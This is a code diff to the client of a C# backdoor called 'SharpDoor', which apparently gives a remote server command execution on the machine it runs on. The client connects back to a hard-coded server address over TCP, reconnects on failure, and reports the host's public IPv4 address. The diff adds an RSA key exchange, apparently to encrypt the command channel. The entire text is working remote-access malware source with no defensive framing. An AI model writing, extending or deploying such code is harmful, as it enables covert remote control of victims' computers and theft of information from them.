@@ -2,18 +2,15 @@
 using System.Net.Sockets;
 using System.Text;
 using System.IO;
+using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Collections.Generic;
 using System.Threading;
-using System.Linq;
-using System.Runtime.CompilerServices;
-using System.Diagnostics;
-using System.ComponentModel.Design.Serialization;
+using System.Xml.Serialization;
 
 namespace SharpDoor_Client    //Client side console app
 {
-
     class Program
     {
         public static int Execute_Command(string command, NetworkStream stream, string directory, TcpClient client)    //Executes a command from the server
@@ -222,13 +219,20 @@ namespace SharpDoor_Client    //Client side console app
             string INTADDR2 = "192.168.0.14";
             List<int> PORTS = SupportFuncLib.GetPorts();    //Gather Ports list
 
-            reboot: //reboot exception catcher
+            reboot: //reboot exception catcher label
             int PORT = 0;
             try
             {
-                port_change:      //Port change label
+            port_change:      //Port change label
                 TcpClient client = new TcpClient(INTADDR1, PORTS[PORT]);   //Create TCP Connection with server
                 NetworkStream stream = client.GetStream();
+                RSACryptoServiceProvider csp = new RSACryptoServiceProvider();  //Create new crypto service provider
+                RSAParameters _privateKey = Crypto.PrivateKey(csp); //extract private key from csp
+                RSAParameters _publicKey = Crypto.PublicKey(csp);   //extract public key from csp
+                string pubKey = Crypto.PublicKeyString(_publicKey); //convert pub key to string to send it
+                string serv_pubKey = Crypto.ReceivePubKey(stream, client);  //receive serv pub key
+                Crypto.SendPubKey(stream, client, pubKey);  //Send pub key to serv
+
                 string ipv4 = SupportFuncLib.GetExternalIpv4();     //Store Public IPV4 to a string
                 Send(stream, ipv4);     //Send Public IPV4 to server
 
